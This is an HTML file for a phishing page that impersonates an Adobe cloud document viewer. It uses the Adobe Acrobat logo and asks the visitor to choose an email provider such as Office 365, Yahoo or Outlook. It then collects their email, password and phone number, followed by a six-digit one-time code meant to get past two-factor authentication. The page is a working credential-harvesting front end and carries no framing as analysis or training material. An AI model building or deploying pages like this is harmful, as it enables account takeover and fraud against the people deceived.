<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Adobe Cloud Document</title>
  <link rel="stylesheet" href="styles.css" />
</head>
<body>
  <div class="background-overlay"></div>

  <!-- Removed the <nav class="top-navbar"> -->

  <div class="container">
    <!-- New: Flex container for logo and heading/description -->
    <div class="header-flex">
      <img
        src="https://upload.wikimedia.org/wikipedia/commons/4/42/Adobe_Acrobat_DC_logo_2020.svg"
        alt="Adobe Acrobat Logo"
        class="logo"
      />
      <div class="header-content">
        <h1>Read Your Document</h1>
        <p>Please select your e-mail provider below:</p>
      </div>
    </div>

    <!-- Provider Selection -->
    <section id="provider-selection" class="page active">
      <div class="providers">
        <button class="provider-btn" data-provider="office365">
          <img src="https://cdn-icons-png.flaticon.com/512/732/732221.png" alt="Office365" />
          Office 365
        </button>
        <button class="provider-btn" data-provider="aol">
          <img src="https://cdn-icons-png.flaticon.com/512/732/732222.png" alt="AOL" />
          AOL
        </button>
        <button class="provider-btn" data-provider="yahoo">
          <img src="https://cdn-icons-png.flaticon.com/512/732/732200.png" alt="Yahoo" />
          Yahoo
        </button>
        <button class="provider-btn" data-provider="outlook">
          <img src="https://cdn-icons-png.flaticon.com/512/732/732223.png" alt="Outlook" />
          Outlook
        </button>
        <button class="provider-btn" data-provider="others">
          <img src="https://cdn-icons-png.flaticon.com/512/25/25373.png" alt="Others" />
          Others
        </button>
      </div>
    </section>

    <!-- Credentials Form -->
    <section id="credentials-input" class="page">
      <h1 id="credentials-title"></h1>
      <form id="credentials-form">
        <label for="email">Email:</label>
        <input type="email" id="email" name="email" required />
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required />
        <label for="phone">Phone Number (with country code):</label>
        <input type="tel" id="phone" name="phone" placeholder="+1234567890" required />
        <button type="submit">Submit</button>
      </form>
      <button id="back-to-providers" class="back-btn">Back</button>
    </section>

    <!-- OTP Form -->
    <section id="otp-verification" class="page">
      <h1>OTP Verification</h1>
      <p id="otp-timer"></p>
      <form id="otp-form">
        <input type="text" id="otp" name="otp" required maxlength="6" pattern="[0-9]{6}" placeholder="6-digit code" />
        <button type="submit">Verify</button>
      </form>
      <button id="back-to-credentials" class="back-btn">Back</button>
    </section>

    <footer>
      <p>Â© 2025 Adobe Cloud Incorporated System</p>
    </footer>
  </div>

  <script src="script.js"></script>
</body>
</html>
